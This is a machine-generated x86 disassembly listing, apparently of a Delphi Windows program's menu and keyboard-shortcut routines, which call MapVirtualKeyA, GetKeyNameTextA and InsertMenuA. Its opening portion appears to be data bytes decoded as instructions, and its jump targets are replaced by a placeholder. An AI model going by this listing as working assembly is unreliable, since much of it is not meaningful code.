add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ edi + ecx ] ch
inc ebp
add [ edi + ecx ] bh
outsb
jne r-xdata
outsd
test cl al
inc esp
or eax 0x6f42616d
insd
je r-xdata
jne r-xdata
fadd st0
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc eax
add al dh
pushfd
mov eax [ 0x34ac0041 ]
inc eax
cmp al 0xc2
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] bl
rol [ eax + eax + 0xd ] 0x6d
popad
dec esp
je r-xdata
rol [ eax + eax + 0x3 ] 0xf
add al dh
0x34b40041 0x40
test al 0x34
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] ch
inc esp
add [ eax ] bh
add [ eax ] al
les edi [ ebp - 0x5e63ffbc ]
inc ecx
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] dh
outsd
inc edx
outsd
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] bh
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
xchg esp eax
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
jo r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec eax
push cs
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
sub [ esp + eax * 2 + 0x4800 ] bl
call eax
or al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
inc ecx
add [ eax - 0x53ffbfcc ] ah
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
insd
popad
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
adc al 0x41
add [ eax ] dh
add [ eax ] al
push [ esi + ecx + 0x7ac0045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
adc eax 0x16e80041
inc ebp
add al dh
push ss
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
inc eax
add eax 0x75411100
je r-xdata
mov al [ 0x4c0044b8 ]
cmovne eax [ eax ]
pop esp
cmovne eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
rol [ eax + eax + 0xd ] 0x74
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xc5
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbdbd ] bh
jo r-xdata
inc ebx
push 0x65676e61
lodsb [ esi ]
adc eax 0x700041
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
rol [ eax + eax + 0x68 ] 0x0
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
rol [ eax + eax + 0x69 ] 0x0
add bh bh
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add al cl
cmp eax 0x3f6c0041
inc ecx
add [ ecx + eax * 2 + 0x41 ] dl
add [ esi + edi ] bl
inc ecx
add [ eax - 0x5bffbec2 ] bl
adc [ ebp ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] dh
sbb eax [ ecx ]
mov al [ 0xffffffffac004034 ]
outsb
lodsb [ esi ]
mov dh 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
jne r-xdata
rol [ eax + eax + 0x78 ] 0xbe
inc esp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ esp + eax * 8 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x140044c4 ] ah
add [ eax ] al
inc esp
inc edx
add [ ebp + eax * 2 + 0x42 ] bl
add [ eax * 2 + 0x45280042 ] bh
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
clc
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al bh
imul esi [ ebx + 0x74 ] 0x44c4f890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax * 8 + 0x80044 ] al
add [ eax ] al
mov eax 0xa0004243
jae r-xdata
dec ebp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov al [ 0x2c0044b8 ]
cmovne eax [ eax ]
cmp al 0xf
add [ eax + 0x600044c0 ] bl
add [ eax ] al
jmp [ eax ]
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_440ff4
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add [ edi + ecx + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov eax 0xf4c0044
inc ebp
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44c544
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43b798
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_440ff4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44c59c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44c5d4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403fa8
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404218
sub_44c628
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44c811
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404040
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404190
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404040
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404040
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404190
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404190
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403fa8
mov eax esi
call sub_403fa8
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404040
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407f50
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042b4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44c5d4
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404270
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404040
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404270
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404270
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c818
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fcc
retn
sub_44c82c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404268
push eax
mov eax edi
call sub_404268
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404268
push eax
mov eax edi
call sub_404468
push eax
mov eax [ esi ]
call sub_404468
pop edx
pop ecx
call sub_407e30
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404268
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404508
sub_44c888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_44c963
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44c82c
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44c82c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44c82c
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44c82c
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c96a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44c628
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407de0
test eax eax
jne r-xdata
sub_44c9a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44ef40
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44ef50
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44ca00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44ef40
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44ef40
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44ef50
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44ef50
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44c9a0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44c9a0
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44ef50
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44ef50
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44cb4c
push ebx
mov ebx eax
mov eax ebx
call sub_44923c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_451a5c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44cb84
push ebx
mov ebx eax
mov eax ebx
call sub_449250
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cbb4
push ebx
mov ebx eax
mov eax ebx
call sub_449264
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cbe4
push ebx
mov ebx eax
mov eax ebx
call sub_44928c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cc14
push ebx
mov ebx eax
mov eax ebx
call sub_4492b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043b4
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cc48
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_449278
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cc84
push ebx
mov ebx eax
mov eax ebx
call sub_4492c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ccb8
push ebx
mov ebx eax
mov eax ebx
call sub_4492dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ccec
push ebx
mov ebx eax
mov eax ebx
call sub_4492f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cd20
push ebx
mov ebx eax
mov eax ebx
call sub_41a31c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44cd48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44cd68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44eda8
sub_44cd88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44ee18
sub_44cda8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44ee6c
sub_44cdc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44cde4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ffc
sub_44ce08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44ef98
sub_44ce28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44ef74
sub_44ce48
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44ef88
sub_44ce68
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44ce94
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a2c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44c980
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44f8a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_44cf10
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_451840
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44ef40
test eax eax
jg r-xdata
mov edx esi
call sub_44f2d8
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44ef50
call sub_403258
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403258
lea eax [ esi + 0x44 ]
call sub_40d250
lea eax [ esi + 0x78 ]
call sub_40d250
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44d32c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_414418
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
call sub_403258
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_44cfc4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d21f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d226
lea eax [ ebp - 0x40 ]
call sub_403fa8
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404040
mov eax ebx
call sub_44ef40
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44d4d4
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043b4
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44ef40
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44f4fc
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44c628
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404328
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404468
push eax
mov eax ebx
call sub_44d4d4
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44eb18
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043b4
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
